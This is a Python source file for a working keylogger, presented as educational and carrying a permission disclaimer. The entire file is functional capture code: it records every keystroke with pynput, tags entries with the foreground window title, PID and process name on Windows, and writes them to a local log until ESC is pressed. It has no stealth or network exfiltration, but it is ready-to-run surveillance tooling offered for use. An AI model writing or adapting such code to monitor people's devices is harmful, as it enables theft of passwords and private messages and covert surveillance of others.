"""
Educational Keylogger Implementation (Python)

DISCLAIMER:
This tool is for educational purposes only. Only use it on devices you have explicit permission to monitor.
Unauthorized use may be illegal and unethical.

Author: Suhas N Kumar
"""

import sys
import os
import time
import logging
from datetime import datetime
from pynput import keyboard

if sys.platform == "win32":
    try:
        import win32gui
        import win32process
        import psutil
        WIN_SUPPORT = True
    except ImportError:
        WIN_SUPPORT = False
else:
    WIN_SUPPORT = False


class Keylogger:
    def __init__(self, log_file="3keylog_educational.txt"):
        self.log_file = log_file
        self.shift_on = False
        self.caps_on = False
        self.current_win_info = None
        self.last_win_info = None
        self.is_running = True
        self.log_handle = None

        logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(message)s')

        self.caps_on = self._get_initial_caps_state()

        self._init_log_file()

    def _init_log_file(self):
        try:
            self.log_handle = open(self.log_file, "a", encoding="utf-8")
            header_text = (
                "Educational Keylogger Started - Strictly For Ethical Use Only\n"
                f"Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                "Press ESC to stop.\n\n"
            )
            self.log_handle.write(header_text)
            self.log_handle.flush()
        except Exception as e:
            logging.error(f"Failed to open log file: {e}")
            sys.exit(1)

    def _get_initial_caps_state(self):
        if sys.platform == "win32" and WIN_SUPPORT:
            try:
                import win32api
                import win32con
                state = win32api.GetKeyState(win32con.VK_CAPITAL)
                return state != 0
            except Exception as e:
                logging.warning(f"Failed to get initial caps lock state: {e}")
                return False
        else:
            return False

    def _get_active_window_info(self):
        if WIN_SUPPORT:
            try:
                hwnd = win32gui.GetForegroundWindow()
                _, pid = win32process.GetWindowThreadProcessId(hwnd)

                proc_name = "Unknown Process"
                try:
                    proc = psutil.Process(pid)
                    proc_name = proc.name()
                except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
                    logging.warning(f"Failed to get process name for PID {pid}: {e}")

                win_title = win32gui.GetWindowText(hwnd)
                return win_title if win_title else "Unknown Window", pid, proc_name
            except Exception as e:
                logging.error(f"Error getting window info: {e}")
                return "Unknown Window", None, "Unknown Process"
        else:
            return None, None, None

    def _on_key_press(self, key):
        try:
            if key in (keyboard.Key.shift, keyboard.Key.shift_r):
                self.shift_on = True
            elif key == keyboard.Key.caps_lock:
                self.caps_on = not self.caps_on

            if WIN_SUPPORT:
                self.current_win_info = self._get_active_window_info()
                if self.current_win_info != self.last_win_info:
                    title, pid, p_name = self.current_win_info
                    log_msg = f"\n[Window: '{title}'"
                    if pid is not None:
                        log_msg += f" | PID: {pid}"
                    if p_name != "Unknown Process":
                        log_msg += f" | Process: {p_name}"
                    log_msg += f"] - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n" # Timestamp here for window change
                    self._write_log(log_msg)
                    self.last_win_info = self.current_win_info

            if hasattr(key, 'char') and key.char is not None:
                char = key.char
                if self.caps_on ^ self.shift_on:
                    char = char.upper()
                else:
                    char = char.lower()
                self._write_log(char)
            else:
                key_name = str(key).replace('Key.', '')
                special_keys = {
                    "space": " ",
                    "enter": f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n", # Timestamp when Enter is pressed
                    "tab": "\t", "backspace": "[BACKSPACE]",
                    "esc": "[ESC]", "shift": "", "shift_r": "", "ctrl_l": "[CTRL]",
                    "ctrl_r": "[CTRL]", "alt_l": "[ALT]", "alt_r": "[ALT]", "caps_lock": "[CAPS_LOCK]",
                    "cmd": "[CMD]", "up": "[UP]", "down": "[DOWN]", "left": "[LEFT]",
                    "right": "[RIGHT]", "delete": "[DELETE]", "home": "[HOME]", "end": "[END]",
                    "page_up": "[PAGE_UP]", "page_down": "[PAGE_DOWN]", "f1": "[F1]", "f2": "[F2]",
                    "f3": "[F3]", "f4": "[F4]", "f5": "[F5]", "f6": "[F6]", "f7": "[F7]",
                    "f8": "[F8]", "f9": "[F9]", "f10": "[F10]", "f11": "[F11]", "f12": "[F12]",
                    "print_screen": "[PRINT_SCREEN]", "scroll_lock": "[SCROLL_LOCK]",
                    "pause": "[PAUSE]", "insert": "[INSERT]", "num_lock": "[NUM_LOCK]",
                }
                mapped_str = special_keys.get(key_name, f"[{key_name.upper()}]")
                if mapped_str:
                    self._write_log(mapped_str)
        except Exception as e:
            logging.error(f"Error in key press: {e}")

    def _on_key_release(self, key):
        try:
            if key in (keyboard.Key.shift, keyboard.Key.shift_r):
                self.shift_on = False

            if key == keyboard.Key.esc:
                self._write_log("\n[Keylogger stopped by user pressing ESC]\n")
                self.is_running = False
                return False
        except Exception as e:
            logging.error(f"Error in key release: {e}")

    def _write_log(self, content):
        if not self.log_handle:
            logging.error("Log file not open. Cannot log.")
            return

        # Removed general timestamping from here
        log_entry = content

        try:
            self.log_handle.write(log_entry)
            self.log_handle.flush()
        except Exception as e:
            logging.error(f"Error writing to log file: {e}")

    def start(self):
        print("=== Educational Keylogger Started ===")
        print("This keylogger logs keys to file:", os.path.abspath(self.log_file))
        print("Press ESC to stop.")
        print("Ethical use only! Do not use without permission.\n")

        try:
            with keyboard.Listener(on_press=self._on_key_press, on_release=self._on_key_release) as listener:
                while self.is_running:
                    time.sleep(0.1)
                listener.join()
        except Exception as e:
            logging.error(f"Error in keylogger listener: {e}")
        finally:
            if self.log_handle:
                self.log_handle.close()
                logging.info(f"Log file '{self.log_file}' closed.")


if __name__ == "__main__":
    try:
        from pynput import keyboard
    except ImportError:
        print("Error: 'pynput' library not found.")
        print("Install with: pip install pynput")
        sys.exit(1)

    keylogger = Keylogger()
    keylogger.start()
